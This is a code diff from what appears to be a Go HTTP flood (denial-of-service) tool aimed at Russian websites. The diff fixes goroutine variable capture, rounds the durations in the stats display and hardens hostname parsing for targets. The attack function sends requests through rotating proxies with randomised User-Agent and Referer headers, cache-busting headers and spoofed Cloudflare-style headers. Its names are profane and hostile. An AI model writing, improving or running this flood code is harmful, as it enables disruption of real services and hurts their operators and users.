@@ -188,14 +188,14 @@ func main() {
 					statData[strike.Url] = site
 				}
 
-				go func(huilo *strikeItem, proxy *proxyItem) {
+				go func(huilo strikeItem, proxy proxyItem) {
 					defer func() { <-limiter }()
 					if err := russiaWarShipFuckYou(huilo, proxy); err != nil {
 						atomic.AddInt32(&site.failCnt, 1)
 					} else {
 						atomic.AddInt32(&site.succCnt, 1)
 					}
-				}(&strike, &proxyList[pId])
+				}(strike, proxyList[pId])
 			}
 
 			if pId+1 == int32(len(proxyList)) {
@@ -377,7 +377,7 @@ func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Du
 					if ok {
 						succ = atomic.LoadInt32(&site.succCnt)
 						fail = atomic.LoadInt32(&site.failCnt)
-						diff = ct.Sub(site.startTime)
+						diff = ct.Sub(site.startTime).Round(time.Second)
 					}
 					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n",
 						i+1,
@@ -454,27 +454,36 @@ func refreshIpInfo() {
 	return // ipEcho.String()
 }
 
-func russiaWarShipFuckYou(huilo *strikeItem, pr *proxyItem) error {
+func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
 	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
 	if err != nil {
 		fmt.Printf("couldn't create new request: %v\n", err)
 		return err
 	}
-
-	host, _ := url.Parse(huilo.Url)
+	var hostname string
+	host, err := url.Parse(huilo.Url)
+	if err != nil {
+		hostname = strings.Replace(huilo.Url, "http://", "", 1)
+		hostname = strings.Replace(hostname, "https://", "", 1)
+		if path := strings.IndexRune(hostname, '/'); path >= 0 {
+			hostname = hostname[:path]
+		}
+	} else {
+		hostname = host.Hostname()
+	}
 	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
 	req.Header.Set("Cache-Control", "no-cache")
 	req.Header.Set("Accept-Charset", acceptCharset)
 	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
-	req.Header.Set("Host", host.Hostname())
+	req.Header.Set("Host", hostname)
 	req.Header.Set("x-forwarded-proto", "https")
 	req.Header.Set("cf-visitor", "https")
 	req.Header.Set("Accept-Language", "ru")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 
-	cl, err := proxyClient(pr)
+	cl, err := proxyClient(&pr)
 	if err != nil {
 		fmt.Printf("proxyClient error: %v\n", err.Error())
 		return fmt.Errorf("proxyClient error: %v\n", err.Error())
